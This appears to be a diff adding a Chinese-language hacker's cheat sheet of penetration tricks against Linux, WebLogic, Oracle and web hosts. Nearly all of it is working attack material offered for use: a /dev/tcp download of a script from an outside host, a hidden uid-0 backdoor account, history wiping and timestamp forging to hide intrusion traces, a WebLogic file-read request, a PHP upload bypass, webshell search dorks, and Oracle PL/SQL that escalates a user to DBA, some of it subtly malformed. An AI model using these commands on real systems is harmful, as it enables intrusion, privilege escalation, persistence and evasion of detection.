@@ -1,0 +1,128 @@
+1.无wget nc等下载工具时下载文件
+exec 5<>/dev/tcp/yese.yi.org/80 &&echo -e "GET /c.pl HTTP/1.0\n" >&5 && cat<&5 > c.pl
+
+2.Linux添加uid为0的用户
+useradd -o -u 0 cnbird
+
+3.bash去掉history记录
+export HISTSIZE=0
+export HISTFILE=/dev/null
+
+4.SSH反向链接
+ssh -C -f -N -g -R 44:127.0.0.1:22 cnbird@ip -p 指定远端服务器SSH端口
+然后服务器上执行ssh localhost  -p 44即可
+
+5.weblogic本地读取文件漏洞
+curl -H "wl_request_type: wl_xml_entity_request" -H "xml-registryname: ../../" -H "xml-entity-path: config.xml" http://server/wl_management_internal2/wl_management
+
+6.apache查看虚拟web目录
+./httpd -t -D DUMP_VHOSTS
+
+7.cvs渗透技巧
+CVSROOT/passwd   UNIX SHA1的密码文件
+CVSROOT/readers
+CVSROOT/writers
+CVS/Root    
+CVS/Entries     更新的文件和目录内容
+CVS/Repository
+
+8.Cpanel路径泄露
+/3rdparty/squirrelmail/functions/plugin.php
+
+9.修改上传文件时间戳(掩盖入侵痕迹)
+touch -r 老文件时间戳 新文件时间戳
+
+10.利用baidu和google搜索目标主机webshell
+intitle:PHPJackal 1t1t
+
+11.包总补充
+创建临时“隐藏”目录 mkdir /tmp/...
+/tmp/...目录在管理员有宿醉的情况下是“隐藏”的，可以临时放点exp啥的
+
+12.利用linux输出绕过gif限制的图片
+printf "GIF89a\x01\x00\x01\x00<?php phpinfo();?>" > poc.php
+
+13.读取环境变量对于查找信息非常有帮助
+/proc/self/environ
+
+14.最新的ORACLE 11提升用户权限(只要session权限)
+DBMS_JVM_EXP_PERMS 中的IMPORT_JVM_PERMS
+
+判断登陆权限
+select * from session_privs;
+CREATE SESSION
+
+select * from session_roles;
+
+select TYPE_NAME, NAME, ACTION FROM SYS.DBA_JAVA_POLICY WHERE GRANTEE = 'GREMLIN(用户名)';
+
+DESC JAVA$POLICY$
+
+DECLARE
+POL DBMS_JVM_EXP.TEMP_JAVA_POLICY;
+CURSOR C1 IS SELECT 'GRANT' USER(), 'SYS', 'java.io.FilePermission', '<<ALL FILES>>', 'execute', 'ENABLE' FROM DUAL;
+BEGIN
+OPEN C1;
+FETCH C1 BULK COLLECT INTO POL;
+CLOSE C1;
+DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
+END;
+/
+
+connect / as sysdba
+COL TYPE_NAME FOR A30;
+COL NAME FOR A30;
+COL_ACTION FOR A10;
+SELECT TYPE_NAME, NAME, ACTION FROM SYS.DBA_JAVA_POLICY WHERE GRANTEE = '用户';
+
+connect 普通用户
+set serveroutput on
+exec dbms_java.set_output(10000);
+
+SELECT DBMS_JAVA.SET_OUTPUT_TO_JAVA('ID', 'oracle/aurora/rdbms/DbmsJava', 'SYS', 'writeOutputToFile', 'TEXT', NULL, NULL, NULL, NULL,0,1,1,1,1,0, 'DECLARE PRAGMA AUTONOMOUS_TRANSACTION;'BEGIN EXECUTE IMMEDIATE ''GRANT DBA TO 用户''; END;', 'BEGIN NULL; END;') FROM DUAL;
+
+EXEC DBMS_CDC_ISUBSCRIBE.INT_PURGE_WINDOWS('NO_SUCH_SUBSCRIPTION', SYSDATE());
+
+set role dba;
+
+select * from session_privs;
+
+EXEC SYS.VULNPROC('FOO"||DBMS_JAVA.SET_OUTPUT_TO_SQL("ID","DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE""GRANT DBA TO PUBLIC"";DBMS_OUTPUT.PUT_LINE(:1);END;","TEXT")||"BAR');
+
+SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Test') FROM DUAL;
+SET ROLE DBA;
+
+15. webLogic渗透技巧
+四. Weblogin Script Tool(WLST)
+
+写入到<Domain_home>\\config\\config.xml
+
+1.进行修改:
+<bea_home>\wlserver_10.0\server\bin\setWLSenv.sh
+2.启动WLST
+java weblogic.WLST
+
+wls:/offline> connect('admin', 'admin', 't3://127.0.0.1:7001')
+wls:/bbk/serverConfig> help()
+
+wls:/bbk/serverConfig> edit()
+wls:/bbk/serverConfig> cd('Servers')
+wls:/bbk/serverConfig/Server-cnbird> cd('Log')
+wls:/bbk/serverConfig/Server-cnbird/log> cd('Server-cnbird')
+wls:/bbk/serverConfig/Server-cnbird/log/Server-cnbird> startEdit()
+wls:/bbk/serverConfig/Server-cnbird/log/Server-cnbird !> set('FileCount', '4')
+wls:/bbk/serverConfig/Server-cnbird/log/Server-cnbird !> save()
+wls:/bbk/serverConfig/Server-cnbird/log/Server-cnbird !> activate() 提交对应Active Change
+wls:/bbk/serverConfig/Server-cnbird/log/Server-cnbird !> disconnect()
+wls:/offline> exit()
+
+3.批处理:
+保存以上命令为cnbird.py
+connect('admin', 'admin', 't3://127.0.0.1:7001')
+cd('Servers')
+cd('Log')
+cd('Server-cnbird')
+startEdit()
+set('FileCount', '4')
+save()
+然后执行java weblogic.WLST cnbird.py
